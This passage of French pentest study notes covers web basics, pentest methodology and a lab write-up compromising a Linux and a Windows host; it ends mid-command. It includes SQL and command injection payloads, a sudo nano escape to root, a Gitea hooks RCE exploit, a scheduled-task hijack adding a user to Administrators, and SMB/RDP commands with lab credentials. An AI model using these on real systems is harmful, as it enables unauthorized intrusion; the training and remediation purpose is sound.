</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>SQL (Relational Databases)</strong></summary><div class="indented"><p>Structure : <strong>tables + colonnes + lignes + clés + schémas</strong></p>
<p>Exemples : MySQL, MSSQL, Oracle, PostgreSQL, MariaDB</p>
<p>Avantages :</p>
<p>✔ rapidité</p>
<p>✔ intégrité des données</p>
<p>✔ relations complexes</p>
<p>✔ langage commun : <strong>SQL</strong></p>
<p>Exemple d’architecture users/posts :</p>
<div class="codehilite"><pre><code>users(id, username, first_name, last_name)
posts(id, user_id, date, content)

</code></pre></div>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>NoSQL (Non-Relational Databases)</strong></summary><div class="indented"><p>Structure : varie selon le modèle → pas de schéma strict.</p>
<p>Types :</p>
<ul>
<li><strong>Key-Value</strong></li>
<li><strong>Document-Based</strong> (JSON)</li>
<li><strong>Wide-Column</strong></li>
<li><strong>Graph</strong></li>
</ul>
<p>Exemples :</p>
<ul>
<li><strong>MongoDB</strong> (Document-Based)</li>
<li><strong>Elasticsearch</strong> (search engine)</li>
<li><strong>Cassandra</strong> (hautement scalable)</li>
<li>Redis, DynamoDB, CouchDB…</li>
</ul>
<p>👉 <strong>Firebase Database = NoSQL</strong></p>
<h2>Exemple d’intégration PHP ↔ MySQL</h2>
<p>Connexion :</p>
<div class="codehilite">
<pre><span></span><code><span class="x">$conn = new mysqli("localhost", "user", "pass");</span>
</code></pre>
</div>
<p>Requête vulnérable :</p>
<div class="codehilite">
<pre><span></span><code><span class="x">$query = "select * from users where name like '%$searchInput%'";</span>
</code></pre>
</div>
<p>⚠️ User input non filtré → <strong>SQL Injection</strong></p>
<h1><strong>Development Frameworks &amp; APIs</strong></h1>
<h2>Frameworks</h2>
<p>Ils simplifient la création d’une web app complète :</p>
<ul>
<li><strong>Laravel (PHP)</strong></li>
<li><strong>Django (Python)</strong></li>
<li><strong>Express (Node.js)</strong></li>
<li><strong>Rails (Ruby)</strong></li>
</ul>
<p>Ils apportent :</p>
<p>✔ routing</p>
<p>✔ ORM (accès DB)</p>
<p>✔ sessions</p>
<p>✔ APIs</p>
<p>✔ templates</p>
<h2>APIs et communication front/back-end</h2>
<p>Le front-end communique avec le back-end via des :</p>
<ul>
<li><strong>Query parameters</strong> (GET/POST)</li>
<li><strong>REST APIs</strong></li>
<li><strong>SOAP APIs</strong></li>
</ul>
<h3>SOAP</h3>
<ul>
<li>Format <strong>XML</strong></li>
<li>Plus lourd, utilisé pour les échanges structurés</li>
</ul>
<h3>REST</h3>
<ul>
<li>Basé sur les <strong>URL</strong> : <code>/api/user/1</code></li>
<li>Réponses souvent en <strong>JSON</strong></li>
<li>Méthodes :
<ul>
<li>GET → lire</li>
<li>POST → créer</li>
<li>PUT → créer/modifier (idempotent)</li>
<li>DELETE → supprimer</li>
</ul></li>
</ul>
<p>Pour la question :</p>
<p>→ Faire un GET <code>/index.php?id=0</code> et repérer le nom de l’utilisateur avec id=1</p>
<p>(Le nom change selon la sandbox.)</p>
<h1><strong>Common Web Vulnerabilities (OWASP)</strong></h1>
<p>Les vulnérabilités web les plus fréquentes :</p>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Broken Authentication / Access Control</strong></summary><div class="indented"><p>Exemples :</p>
<ul>
<li>bypass login → <code>' or 0=0 #</code></li>
<li>escalade de rôle → user → admin</li>
<li>accès direct à <code>/admin/</code></li>
</ul>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Malicious File Upload</strong></summary><div class="indented"><p>Si le filtrage est faible, upload d’un shell :</p>
<p><code>image.php.jpg</code> → exécution de code</p>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Command Injection</strong></summary><div class="indented"><p>Si un formulaire passe un input dans une commande OS :</p>
<div class="codehilite"><pre><code>ping $ip

</code></pre></div>
<p>Payload :</p>
<div class="codehilite"><pre><code>127.0.0.1 | whoami

</code></pre></div>
<p>Ex : Shellshock (CVE-2014-6271) → <strong>Command Injection</strong></p>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>SQL Injection</strong></summary><div class="indented"><p>Si la requête inclut des paramètres non filtrés :</p>
<p><code>' OR '1'='1</code> → auth bypass</p>
<p><code>UNION SELECT …</code> → extraction données</p>
<p>Execution système via procédures stockées dans certains DBMS</p>
<h1><strong>Public Vulnerabilities &amp; CVSS</strong></h1>
<p>Quand un composant possède une faille, un identifiant <strong>CVE</strong> lui est attribué.</p>
<p>Outils de recherche :</p>
<ul>
<li>Exploit-DB</li>
<li>Rapid7 DB</li>
<li>NVD</li>
<li>GitHub Security Advisories</li>
</ul>
<h3>CVSS</h3>
<p>Système de scoring pour évaluer la gravité d’une faille.</p>
<p>CVSS v3 :</p>
<ul>
<li><strong>Critical : 9.0 – 10.0</strong></li>
<li><strong>High : 7.0 – 8.9</strong></li>
</ul>
<h1><strong>Next Steps</strong></h1>
<p>Pour progresser en Web Pentest :</p>
<ol>
<li>Créer une VM avec un webserver (Apache/Nginx/IIS)</li>
<li>Faire une petite web app (HTML/CSS/JS)</li>
<li>Ajouter un back-end (PHP/Python/Node)</li>
<li>Ajouter une DB</li>
<li>Créer une API REST</li>
<li>Tester ses propres failles :
<ul>
<li>XSS</li>
<li>CSRF</li>
<li>SQLi</li>
<li>File Upload</li>
</ul></li>
<li>Appliquer des protections</li>
<li>Attaquer des machines EASY sur HTB</li>
</ol>
<p>Modules recommandés après celui-ci :</p>
<ul>
<li>Web Requests (déjà fait)</li>
<li>SQL Injection Fundamentals</li>
<li>JavaScript Deobfuscation</li>
<li>Hacking WordPress</li>
</ul>
</div></details></div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Introduction to Penetration Testing</strong></summary><div class="indented"><h2>Résumé exécutif</h2>
<p>Le pentest (test d’intrusion) consiste à <strong>évaluer, prouver et prioriser</strong> les faiblesses techniques, humaines et organisationnelles d’un SI via des attaques contrôlées et <strong>autorisées</strong>. Ce module couvre :</p>
<ul>
<li>les <strong>types</strong> de pentest (Black/Grey/White box, externe/interne),</li>
<li>les <strong>domaines</strong> (réseau, web, mobile, cloud, physique, wireless, logiciel),</li>
<li>les <strong>bénéfices</strong> (posture, conformité, ROI, continuité),</li>
<li>l’<strong>éthique</strong> et le <strong>cadre légal</strong>,</li>
<li>la <strong>différence</strong> pentest vs <strong>vulnerability assessment</strong>,</li>
<li>le <strong>processus</strong> complet d’une mission (9 phases),</li>
<li>les <strong>prérequis</strong>, <strong>compétences</strong>, <strong>méthodologies</strong>, et des <strong>spécifiques</strong> par domaine (web, réseau, cloud, physique, SE, mobile, RE),</li>
<li>l’<strong>exploitation</strong> des résultats (rapport, remédiation, re‑test),</li>
<li>la <strong>vie quotidienne</strong> et le <strong>métier</strong>.</li>
</ul>
<h2>Définitions &amp; objectifs</h2>
<ul>
<li><strong>But</strong> : démontrer l’impact réel d’un risque (confidentialité, intégrité, disponibilité), prioriser les corrections, satisfaire conformité et parties prenantes.</li>
<li><strong>Approche</strong> : offensive, <strong>dans le cadre</strong> (RoE/autorisation écrite), avec <strong>documentation</strong> et <strong>neutralisation des dégâts</strong> (Do No Harm).</li>
</ul>
<h2>Types de pentest</h2>
<ul>
<li><strong>Black Box</strong> : aucune info de départ → simule un attaquant externe.</li>
<li><strong>Grey Box</strong> : info partielle/accès limité → simule accès initial (compte low‑priv…).</li>
<li><strong>White Box</strong> : accès aux schémas, code, configs → profondeur &amp; rapidité.</li>
<li><strong>Externe</strong> : assets exposés Internet (web, mail, DNS…).</li>
<li><strong>Interne</strong> : depuis le réseau interne (insider/compromission préalable).</li>
</ul>
<h2>Domaines (cibles)</h2>
<p>Réseau, Applications Web, Mobile, Cloud, Physique &amp; Social Engineering, Wireless, Logiciel/firmware.</p>
<h2>Bénéfices clés</h2>
<ul>
<li><strong>Posture de sécurité</strong> améliorée (découverte + preuves d’exploitation).</li>
<li><strong>Conformité &amp; gestion des risques</strong> (PCI DSS, HIPAA, ISO 27001, GDPR, NIS…).</li>
<li><strong>Continuité &amp; réputation</strong> (plans d’incident, segmentation, patch).</li>
<li><strong>Validation des contrôles</strong> (efficacité réelle), <strong>amélioration continue</strong>, <strong>avantage compétitif</strong>.</li>
</ul>
<h2>Conformité (aperçu)</h2>
<ul>
<li><strong>US</strong> : PCI DSS (annuel), HIPAA (évaluations), SOC 2 (recommandé), GLBA (annuel).</li>
<li><strong>UE</strong> : GDPR (tests réguliers), <strong>NIS</strong> (gestion des risques).</li>
<li><strong>UK</strong> : DPA 2018 (aligné GDPR), <strong>DSP Toolkit</strong> (santé).</li>
<li><strong>IN</strong> : RBI‑ISMS (banques).</li>
<li><p><strong>BR</strong> : LGPD.</p>
<p><strong>Méthodo compliance</strong> : périmètre, traçabilité, cotation du risque, reporting orienté exigences, attestation.</p></li>
</ul>
<h2>Éthique &amp; légal</h2>
<ul>
<li><strong>Principe #1 : Do No Harm.</strong></li>
<li><strong>Confidentialité</strong> stricte (NDA, gestion/effacement des données).</li>
<li><strong>Autorisation écrite</strong> obligatoire : <strong>SoW/MSA</strong>, <strong>RoE</strong> (“Get Out of Jail Free”).</li>
<li><strong>Conduite pro</strong> : transparence, communication, déclaration immédiate d’incident.</li>
</ul>
<h2>Pentest vs Vulnerability Assessment (VA)</h2>
<ul>
<li><strong>VA</strong> : inventaire <strong>large</strong> des <strong>vulnérabilités connues</strong> (scanners, signatures), faux positifs à trier.</li>
<li><p><strong>Pentest</strong> : <strong>exploitation ciblée</strong> (manuel + outils) pour prouver l’impact métier.</p>
<p>→ <strong>Complémentaires</strong> : VA fréquent (mensuel/trimestriel), pentest annuel/avant mises en prod majeures.</p></li>
</ul>
<h2>Processus d’un pentest (9 phases)</h2>
<ol>
<li><strong>Pré‑engagement</strong> : périmètre, RoE, NDA, planning, contacts.</li>
<li><strong>Collecte d’info</strong> (OSINT passif, recon active : scan/enum).</li>
<li><strong>Évaluation des vulnérabilités</strong> (outils + analyse humaine).</li>
<li><strong>Exploitation</strong> (chaînes d’attaque, preuve d’impact).</li>
<li><strong>Post‑exploitation</strong> (élévation, persistance, exfil tests).</li>
<li><strong>Mouvements latéraux</strong> (relations de confiance, credentials).</li>
<li><strong>PoC</strong> (reproductibilité, scripts, preuves).</li>
<li><strong>Reporting</strong> (exec summary, technique, remédiations, risques).</li>
<li><strong>Remédiation &amp; re‑tests</strong> (accompagnement, validation correctifs).</li>
</ol>
<h2>Prérequis d’une mission</h2>
<ul>
<li><strong>Légal</strong> : MSA/SoW, NDA, RoE ; <strong>assurance</strong> pro.</li>
<li><strong>Scope</strong> &amp; fenêtres de test ; <strong>assets sensibles</strong> (exclusions/soin).</li>
<li><strong>Canaux de comm &amp; procédures d’urgence</strong>.</li>
<li><strong>Préparation environnement &amp; outils</strong> (isolés, à jour, licenciés).</li>
<li><strong>Backups vérifiés</strong> ; <strong>exigences de reporting</strong> (format, preuves).</li>
</ul>
<h2>Compétences requises</h2>
<ul>
<li><strong>Tech</strong> : réseaux (TCP/UDP/HTTP/S, routage, subnet), OS (Linux/Windows), scripting (<strong>Python</strong>, Bash), sécurité (auth, chiffrement), vulnérabilités (SQLi, XSS, BOF…), outils (Nmap, Wireshark, Nessus/OpenVAS, Burp, Metasploit…).</li>
<li><strong>Spécifiques</strong> : web, mobile, cloud, API, wireless, RE.</li>
<li><strong>Soft skills</strong> : rédaction &amp; pédagogie, gestion de projet/temps, éthique, mindset <strong>adversarial</strong>.</li>
<li><strong>Veille continue</strong>.</li>
</ul>
<h2>Méthodologies &amp; cadres</h2>
<ul>
<li><strong>PTES</strong> (7 phases : pré‑engagement → reporting).</li>
<li><strong>NIST</strong> (guide formel planif/exécution/post‑test).</li>
<li><strong>OWASP TG</strong> (web : IG → config/deploy → identité → auth).</li>
<li><p><strong>MITRE ATT&amp;CK</strong> (tactiques/techniques réelles pour scénarios).</p>
<p>→ Usage <strong>hybride</strong> + méthodo <strong>personnelle</strong> (checklists, scripts, RETEX).</p></li>
</ul>
<h2>Web Application Pentesting (essentiels)</h2>
<ul>
<li><strong>3 tiers</strong> : présentation, applicatif, base de données.</li>
<li>Vulnérabilités majeures : <strong>injections</strong> (SQL/command), <strong>auth &amp; sessions</strong>, <strong>XSS</strong>.</li>
<li>Outils : <strong>Burp Suite</strong> / <strong>OWASP ZAP</strong>, DevTools, scripts (Python).</li>
<li><strong>Légal/éthique</strong> : permission explicite, divulgation responsable.</li>
</ul>
<h2>Network Security Testing (essentiels)</h2>
<ul>
<li>Vuln. fréquentes : services mal configurés, non‑patchés, <strong>protocoles non sûrs</strong> (FTP/Telnet/HTTP), faiblesse auth (MFA absent), segmentation faible, interfaces admin exposées, contrôles manquants.</li>
<li>Outils : <strong>Nmap</strong>, <strong>Nessus/OpenVAS</strong>, <strong>Metasploit</strong>, <strong>Wireshark</strong>, <strong>John/Hashcat</strong>, <strong>Aircrack‑ng</strong> (Wi‑Fi).</li>
<li>Pièges : bâcler la recon, dépendre des scanners, ignorer la vérification manuelle, faible communication.</li>
</ul>
<h2>Cloud Security Testing</h2>
<ul>
<li><strong>Modèles</strong> : <strong>IaaS / PaaS / SaaS</strong> ; <strong>Shared Responsibility Model</strong> &amp; AUP providers.</li>
<li>Étapes : enum des ressources → IAM (rôles/permissions) → <strong>config review</strong> (buckets publics, SG) → réseau virtuel → sécurité des données (chiffrement, DLP, KMS) → appli &amp; <strong>API</strong>.</li>
<li>Vulnérabilités : IAM trop permissif, storage exposé, API faibles, logs/monitoring insuffisants, conteneurs (root, images obsolètes), segmentation cloud laxiste, crypto absente.</li>
<li>Outils : cloud natifs (AWS Inspector, Azure Security Center), <strong>Scout Suite</strong>, <strong>Prowler</strong>, <strong>CloudSploit</strong> ; conteneurs (<strong>Trivy, Clair, Anchore</strong>); API (Postman, Burp).</li>
</ul>
<h2>Physical Security Testing</h2>
<ul>
<li><strong>OSINT</strong> initial, repérage (caméras, patrouilles, habitudes).</li>
<li>Techniques : <strong>tailgating</strong>, badges/RFID (clonage), lockpicking (autorisé), test de procédures d’accueil.</li>
<li><strong>RoE à porter</strong> en permanence ; respect vie privée &amp; sécurité des personnes.</li>
</ul>
<h2>Social Engineering (SE)</h2>
<ul>
<li>Leviers psycho : <strong>Autorité</strong>, <strong>Urgence</strong>, <strong>Peur</strong>, <strong>Curiosité</strong>, <strong>Confiance</strong>.</li>
<li>Techniques : <strong>phishing</strong>, <strong>spear‑phishing</strong>, <strong>pretexting</strong>, <strong>baiting</strong>, <strong>tailgating</strong>.</li>
<li><strong>Ethique</strong> : autorisation stricte, soutien aux employés, pas de dommages psychologiques.</li>
</ul>
<h2>Mobile Security Testing</h2>
<ul>
<li><strong>Environnement</strong> : Android (root/non‑root), iOS (jailbreak/non‑JB), émulateurs.</li>
<li>Outils : <strong>ADB</strong>, <strong>JADX</strong>/Ghidra (reverse), <strong>Frida</strong>/<strong>Objection</strong> (runtime), Burp Mobile Assistant.</li>
<li>Android : APK, manifeste/permissions, statique (JADX), dynamique (Frida).</li>
<li>iOS : IPA (souvent à déchiffrer), sandbox/code signing ; focus <strong>Keychain</strong>, pinning, stockage local, URL schemes, biométrie.</li>
<li>Vuln. : stockage non sûr (tokens en clair), TLS/pinning mal fait, injections côté client (DB locale/WebView), contournements runtime.</li>
</ul>
<h2>Reverse Engineering (RE)</h2>
<ul>
<li>Bases : archi CPU, <strong>assembleur</strong>, mémoire (<strong>stack</strong>/heap/segments), syscalls.</li>
<li>Outils : <strong>IDA Pro</strong>, <strong>Ghidra</strong>, <strong>radare2</strong> ; <strong>GDB/WinDbg/x64dbg</strong> ; <strong>dnSpy/ILSpy/JADX</strong>.</li>
<li>Analyses : <strong>statique</strong> (sans exécuter) vs <strong>dynamique</strong> (exécution instrumentée).</li>
<li>Cas : malware, bypass d’auth, analyse de protocoles ; protections : obfuscation, packing, anti‑debug.</li>
</ul>
<h2>Exploitation des résultats</h2>
<ul>
<li><strong>Rapport</strong> : description technique + <strong>impact métier</strong>, preuves, <strong>cotation (CVSS)</strong>, priorisation.</li>
<li><strong>Remédiations</strong> : quick wins (mitigations) + correctifs durables (root cause), pas “patcher” générique mais <strong>actions concrètes</strong>.</li>
<li><strong>Support</strong> : Q/R, contrôles compensatoires, priorisation, <strong>re‑tests</strong> documentés.</li>
<li><strong>Améliorations durables</strong> : sensibilisation, politiques, SDLC sécurisé, monitoring continu, IRP.</li>
</ul>
<h2>Quotidien d’un pentester</h2>
<ul>
<li>Veille matinale (CVE/actu), planification ; recon/scans ; exploitation l’aprèm (manuel/scripts/SE) ;</li>
<li>Analyse, tri des FP, <strong>rédaction</strong> et échanges client ;</li>
<li><strong>Apprentissage continu</strong> (labs, bounties, confs).</li>
</ul>
<h2>Le métier</h2>
<ul>
<li>Demande forte (tous secteurs), salaires compétitifs, trajectoires variées (senior, lead, archi, CISO, consulting).</li>
<li><strong>Défis</strong> : rythme des menaces, deadlines, confidentialité, équilibre de vie.</li>
<li><strong>Croissance</strong> : cloud/IoT/IA ; <strong>l’automatisation &amp; l’IA</strong> augmentent, ne remplacent pas l’humain.</li>
</ul>
<h3>Outils par domaine (express)</h3>
<ul>
<li><strong>Réseau</strong> : Nmap, Nessus/OpenVAS, Wireshark, Metasploit.</li>
<li><strong>Web/API</strong> : Burp/ZAP, ffuf, sqlmap, Postman.</li>
<li><strong>Cloud</strong> : Scout Suite, Prowler, CloudSploit, AWS/Azure/GCP natifs.</li>
<li><strong>Mobile</strong> : ADB, Frida, Objection, JADX, Ghidra.</li>
<li><strong>Wireless</strong> : Aircrack‑ng, hcxdumptool/hcxtools.</li>
<li><strong>RE</strong> : IDA, Ghidra, radare2, x64dbg/WinDbg, dnSpy/ILSpy.</li>
</ul>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Pentest in a Nutshell</strong></summary><div class="indented"><h2>Résumé exécutif</h2>
<p>Lors de l’évaluation « Pentest in a Nutshell », deux hôtes de labo ont été évalués.</p>
<ul>
<li><strong>Linux (Ubuntu 22.04.4 LTS, 5.15.0)</strong> : accès initial via services exposés (FTP anonyme/WordPress) permettant la récupération de la clé SSH de <em>john</em>. Élévation de privilèges <strong>root</strong> à l’aide de <strong>sudo</strong> (droit NOPASSWD sur <strong>nano</strong> et <code>(ALL:ALL) ALL</code>) puis pillage (clés SSH, mots de passe WordPress, etc.).</li>
<li><strong>Windows (Server 2019 Standard x64, WIN01)</strong> : surface réseau (SSH, RPC/SMB, RDP, Gitea 1.12.4). Accès initial via <strong>Gitea Git Hooks RCE</strong> et/ou identifiants réutilisés <strong>john / SuperSecurePass123</strong> (trouvés dans un script sur un partage SMB). Élévation de privilèges locale par <strong>détournement de tâche planifiée</strong> (script PowerShell <strong>backupprep.ps1</strong> exécuté en <em>Administrator</em> et <strong>modifiable</strong>), ajout de <em>john</em> au groupe <strong>Administrators</strong>.</li>
<li><strong>Impact démontré</strong> : exfiltration de données sensibles (fichier <strong>customer_database.csv</strong> contenant PII/CB), compromission administrateur, clés SSH de service, exposition SMBv1, Git auto‑hébergé obsolète.</li>
</ul>
<p><strong>Risques majeurs</strong> :</p>
<ul>
<li>Mauvaises ACL (Everyone:F) sur scripts d’admin et sur <em>ProgramData</em></li>
<li>Réutilisation/crédentials en dur</li>
<li>Version Gitea vulnérable (&lt; 1.13.0, hooks activés)</li>
<li>Sudoers trop permissif (Linux) et appartenance de <em>www‑data</em> au groupe <em>john</em></li>
</ul>
<h2>Portée &amp; Méthodologie</h2>
<ul>
<li><strong>Méthodo :</strong> PTES / Kill Chain : <em>Recon → Énumération → Évaluation de vulnérabilités → Exploitation → Post‑Exploitation (Escalade) → Pillage → Preuve de concept</em>.</li>
<li><strong>Règles :</strong> actions limitées aux hôtes fournis. Toute « persistence » mise en place est documentée et réversible.</li>
</ul>
<h2>Chronologie détaillée par hôte</h2>
<h3>Linux (10.129.159.216)</h3>
<h3>Information Gathering</h3>
<ul>
<li><strong>Nmap</strong> (exemple) : découverte FTP/HTTP(S)/WordPress.</li>
<li><strong>FTP anonyme</strong> : répertoire personnel de <em>john</em> exposé.</li>
<li><strong>WordPress</strong> : installation fonctionnelle; wp‑config plus tard pillé côté root.</li>
</ul>
<h3>Accès initial</h3>
<ul>
<li><strong>FTP anonyme</strong> → téléchargement de fichiers de <em>john</em> (dont <strong>~/.ssh/id_rsa</strong>).</li>
<li><strong>SSH</strong> : <code>ssh -i id_rsa john@10.129.159.216</code> (clé non protégée par passphrase) → <strong>shell john</strong>.</li>
</ul>
<blockquote>
<p>Alternative notée par le module : l’utilisateur www‑data appartient au groupe john, ce qui permettait de lire les fichiers de john via un accès web.</p>
</blockquote>
<h3>Élévation de privilèges</h3>
<ul>
<li><code>sudo -l</code> → <strong>(root) NOPASSWD: /usr/bin/nano</strong> et <strong>(ALL:ALL) ALL</strong>.
<ul>
<li><strong>Méthode GTFObins (nano)</strong> : <code>sudo nano x</code> → <code>Ctrl+R</code> <code>Ctrl+X</code> → <code>reset; /bin/bash 1&gt;&amp;0 2&gt;&amp;0</code> → <strong>root</strong>.</li>
<li><strong>Méthode directe</strong> : <code>sudo su</code> (mot de passe <strong>SuperSecurePass123</strong> pour <em>john</em> connu).</li>
</ul></li>
</ul>
<h3>Pillage (root)</h3>
<ul>
<li><strong>linpeas.sh</strong> (root) :
<ul>
<li><strong>/root/.ssh/id_rsa</strong> présent.</li>
<li><strong>/var/www/</strong> → <code>wp-config.php</code> : <code>DB_USER=wpuser</code>, <code>DB_PASSWORD=MyVeryStrongPa$$</code>.</li>
<li>AppArmor profils chargés (snap/lxd), <strong>ASLR activé</strong>, <strong>Seccomp désactivé</strong>.</li>
<li>SUID/SGID multiples.</li>
</ul></li>
<li><strong>linpill.sh</strong> : inventaire/artefacts (SUID=55, etc.).</li>
</ul>
<h3>Constats &amp; Recos (Linux)</h3>
<ul>
<li><strong>Sudoers</strong> : supprimer <code>NOPASSWD: /usr/bin/nano</code> et limiter <code>(ALL:ALL) ALL</code>.</li>
<li><strong>Groupes</strong> : retirer <em>www‑data</em> du groupe <em>john</em>.</li>
<li><strong>Secrets</strong> : rotation des clés SSH et mots de passe (john, DB).</li>
<li><strong>Durcissement</strong> : appliquer correctifs kernel; revue SUID; surveiller <code>.bash_history</code> et permissions home.</li>
</ul>
<h3>Windows (10.129.130.98 / WIN01)</h3>
<h3>Information Gathering (externe)</h3>
<ul>
<li><strong>Nmap</strong> : <code>22,135,139,445,3000 (Gitea),3389 (RDP)</code> ouverts; <strong>SMBv1=True</strong>; hôte <strong>WIN01</strong>; Gitea <strong>1.12.4</strong>.</li>
<li><strong>CME/SMB</strong> : session invitée possible; partages <strong>ADMIN$</strong>, <strong>C$</strong>, <strong>Devs</strong>, <strong>IPC$</strong>.</li>
</ul>
<h3>Accès initial</h3>
<ul>
<li><strong>Spider du partage <em>Devs</em></strong> avec <strong>john/SuperSecurePass123</strong> → <code>tmp.ps1</code> contenant identifiants codés en dur (<code>WIN01\john / SuperSecurePass123</code>).</li>
<li><strong>Hydra (validation RDP)</strong> : identifiants valides.</li>
<li><strong>Exploit Gitea</strong> : <strong>gitea_git_hooks_rce</strong> (Metasploit, <em>Windows Dropper</em>) sur <strong>1.12.4</strong> → <strong>meterpreter</strong>.</li>
<li><strong>Connexion RDP</strong> : <code>xfreerdp /u:john /p:SuperSecurePass123 /v:10.129.130.98</code>.</li>
</ul>
<h3>Énumération locale</h3>
<ul>
<li><code>whoami /priv</code> : <strong>SeImpersonatePrivilege</strong> présent.</li>
<li><strong>winPEAS</strong> :
<ul>
<li><strong>Écriture</strong> sur <strong>C:\ProgramData</strong>.</li>
<li><strong>Tâche planifiée</strong> <strong>\CorpBackupAgent</strong> (toutes les 2 min) exécutant <strong>C:\ProgramData\CorpBackup\Scripts\backupprep.ps1</strong> <strong>en Administrator</strong>.</li>
<li>ACL du script : <strong>Everyone:(F)</strong>.</li>
</ul></li>
</ul>
<h3>Élévation de privilèges (PoC)</h3>
<ul>
<li><p>Injection dans <strong>backupprep.ps1</strong> :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">Add-LocalGroupMember</span> <span class="n">-Group</span> <span class="s2">"Administrators"</span> <span class="n">-Member</span> <span class="s2">"WIN01\john"</span>
</code></pre>
</div></li>
<li><p>Exécution : <code>schtasks /run /tn \CorpBackupAgent</code> → <code>net user john</code> <strong>→ Administrators</strong>.</p></li>
</ul>
<h3>Pillage &amp; preuves</h3>
<ul>
<li><strong>Données sensibles</strong> : <code>C:\Users\Administrator\customer_database.csv</code> (PII : noms, SSN, cartes bancaires, etc.).
<ul>
<li><strong>ID client de <em>Nicholas Taylor</em></strong> (extrait) : <strong>7d660ce6-fb54-4006-8446-5ae1b3ae1064</strong>.</li>
</ul></li>
<li><strong>Chemin ADMIN$</strong> : <strong>C:\Windows</strong>.</li>
<li><strong>Wireshark</strong> : <strong>4.2.5</strong> (ProductVersion).</li>
<li><strong>Règles firewall activées</strong> (compte rendu via parsing <strong>netsh</strong>) : <strong>198</strong>.</li>
</ul>
<h3>Recos (Windows)</h3>
<ul>
<li><strong>Gitea</strong> : mise à jour ≥ <strong>1.13</strong> (hooks désactivés par défaut) et config <code>DISABLE_GIT_HOOKS=true</code>.</li>
<li><strong>Secrets</strong> : supprimer identifiants en dur, appliquer <strong>LAPS/EntraID</strong> ; rotation des mots de passe.</li>
<li><strong>Tâches planifiées</strong> : restreindre ACL (retirer <strong>Everyone:F</strong>), signer les scripts, stocker dans un dépôt sécurisé.</li>
<li><strong>SMB</strong> : <strong>désactiver SMBv1</strong>, activer signature/NTLMv2, auditer partages.</li>
<li><strong>Durcissement</strong> : Appliquer correctifs Windows, réduire services, surveiller RDP (NLA/MFA).</li>
<li><strong>Détection</strong> : règles SIEM pour modifications de groupes Admin, exécutions de tâche anormales, création de dépôts Gitea inhabituels.</li>
</ul>
<h2>Vulnérabilités clés &amp; preuves</h2>
<table class="simple-table">
<thead>
<tr>
<th>ID</th>
<th>Actif</th>
<th>Vulnérabilité</th>
<th>Preuve/Artefact</th>
<th>Impact</th>
<th>Remédiation</th>
</tr>
</thead>
<tbody>
<tr>
<td>L‑01</td>
<td>Linux</td>
<td>Sudoers permissif : <code>NOPASSWD: /usr/bin/nano</code> + <code>(ALL:ALL) ALL</code></td>
<td><code>sudo -l</code>, échappement <strong>nano</strong></td>
<td>Root immédiat</td>
<td>Retirer NOPASSWD, limiter sudo par commande et par groupe</td>
</tr>
<tr>
<td>L‑02</td>
<td>Linux</td>
<td>Accès FTP anonyme au home de <em>john</em></td>
<td>Liste FTP, récupération <code>~/.ssh/id_rsa</code></td>
<td>Accès SSH sans mot de passe</td>
<td>Désactiver FTP anonyme, permissions strictes sur home/<code>.ssh</code></td>
</tr>
<tr>
<td>L‑03</td>
<td>Linux</td>
<td>Secrets en clair (WordPress)</td>
<td><code>wp-config.php</code></td>
<td>Mouvement latéral DB et réutilisation</td>
<td>Vault/gestion secrets, rotation</td>
</tr>
<tr>
<td>W‑01</td>
<td>WIN01</td>
<td><strong>Gitea 1.12.4</strong> vulnérable (hooks RCE)</td>
<td>Exploit MSF, shell</td>
<td>RCE appli</td>
<td>Mettre à jour, désactiver hooks</td>
</tr>
<tr>
<td>W‑02</td>
<td>WIN01</td>
<td><strong>SMBv1 activé</strong></td>
<td>CME output</td>
<td>Surface d’attaque accrue (EternalBlue, etc.)</td>
<td>Désactiver SMBv1</td>
</tr>
<tr>
<td>W‑03</td>
<td>WIN01</td>
<td>Script <strong>backupprep.ps1</strong> modifiable <strong>Everyone:F</strong></td>
<td><code>icacls</code></td>
<td>Escalade par <strong>task hijacking</strong></td>
<td>Durcir ACL / signer scripts</td>
</tr>
<tr>
<td>W‑04</td>
<td>WIN01</td>
<td>Creds en dur (<strong>john/SuperSecurePass123</strong>)</td>
<td><code>tmp.ps1</code> + hydra</td>
<td>Reuse / compromission comptes</td>
<td>Supprimer, rotations, SSO</td>
</tr>
</tbody>
</table>
<h2>Preuve de Concept (commandes minimales)</h2>
<h3>Linux → root</h3>
<div class="codehilite">
<pre><span></span><code><span class="c1"># Récupération clé via FTP anonyme</span>
ftp<span class="w"> </span><span class="m">10</span>.129.159.216
<span class="c1"># ... get .ssh/id_rsa</span>
chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>id_rsa<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>john@10.129.159.216

<span class="c1"># Privesc via nano (GTFObins)</span>
sudo<span class="w"> </span>-l
sudo<span class="w"> </span>/usr/bin/nano<span class="w"> </span>any
<span class="c1"># Ctrl+R, Ctrl+X, puis :</span>
reset<span class="p">;</span><span class="w"> </span>/bin/bash<span class="w"> </span><span class="m">1</span>&gt;<span class="p">&amp;</span><span class="m">0</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">0</span>
id
</code></pre>
</div>
<h3>Windows → admin</h3>
<div class="codehilite">
<pre><span></span><code><span class="c1"># Énum SMB &amp; script sensible</span>
crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.130.98<span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.130.98<span class="w"> </span>-u<span class="w"> </span>john<span class="w"> </span>-p<span class="w"> </span><span class="s1">'SuperSecurePass123'</span><span class="w"> </span>--spider<span class="w"> </span>Devs
